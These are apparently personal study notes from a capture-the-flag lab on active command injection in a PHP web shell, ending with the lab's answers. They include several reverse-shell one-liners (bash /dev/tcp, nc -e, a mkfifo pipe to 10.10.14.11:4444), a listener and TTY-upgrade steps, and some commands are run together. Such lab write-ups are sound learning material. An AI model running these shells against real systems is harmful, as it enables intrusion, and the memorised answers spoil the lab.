**What is Active Command Injection?**

Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document. Active command injection will return the response to the user. It can be made visible through several HTML elements.

---

Let's consider a scenario: EvilCorp has started development on a web based shell but has accidentally left it exposed to the Internet. It's nowhere near finished but contains the same command injection vulnerability as before! But this time, the response from the system call can be seen on the page! They'll never learn!

Just like before, let's look at the sample code from evilshell.php and go over what it's doing and why it makes it active command injection. See if you can figure it out. I'll go over it below just as before.

![[Untitled 566.png|Untitled 566.png]]

---

We have an input in http://<IP_ADDRESS>/evilshell.php

![[Untitled 1 31.png|Untitled 1 31.png]]

This input isnt sanitized, so we have Command Injection

![[Untitled 2 24.png|Untitled 2 24.png]]

We can try establish a **Reverse Shell**

![[Untitled 3 24.png|Untitled 3 24.png]]
#### REVERSE SHELL CODE
> [!important]  
> REVERSE SHELL CODE
> bash -c "bash -i &> /dev/tcp/\<IP_ADDRESS\>/\<PORT\> 0\>&1"  
system('bash -c "bash -i\ &\> /dev/tcp/\<IP\>/\<PORT\> 0\>&1"');  
nc \<ip\> \<port\> -e /bin/bash  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\>&1|nc 10.10.14.11 4444 \>/tmp/f
In our side we have
![[Untitled 4 24.png|Untitled 4 24.png]]
nc -nlvp \<PORT\>  
  
#### treat shell
> [!important]  
> Treat shell
> script /dev/null -c bash
> ctrl z
> stty raw -echo; fg
> reset xterm
> export TERM=xterm
> export SHELL=/bin/bash
> stty sizestty rows X columns X  
python3 -c 'import pty;pty.spawn("/bin/bash")'export TERM=xtermctrl + zstty raw -echo; fg  

Success!

![[Untitled 5 17.png|Untitled 5 17.png]]

---

## MACHINE RESOLUTION

![[Untitled 6 15.png|Untitled 6 15.png]]

What strange text file is in the website root directory?

==**drpepper.txt**==

![[Untitled 7 15.png|Untitled 7 15.png]]

How many non-root/non-service/non-daemon users are there?

==**0 zero**==

This is because there is no user “flagged” as non-root/non-service/non-daemon.

![[Untitled 8 14.png|Untitled 8 14.png]]

What user is this app running as?

==**www-data**==

![[Untitled 9 12.png|Untitled 9 12.png]]

What is the user's shell set as?

==**/usr/sbin/nologin**==

![[Untitled 10 9.png|Untitled 10 9.png]]

What version of Ubuntu is running?

==**14.04.4**== LTS

![[Untitled 11 9.png|Untitled 11 9.png]]

Print out the MOTD.  What favorite beverage is shown?

==**DR PEPPER**==

![[Untitled 12 8.png|Untitled 12 8.png]]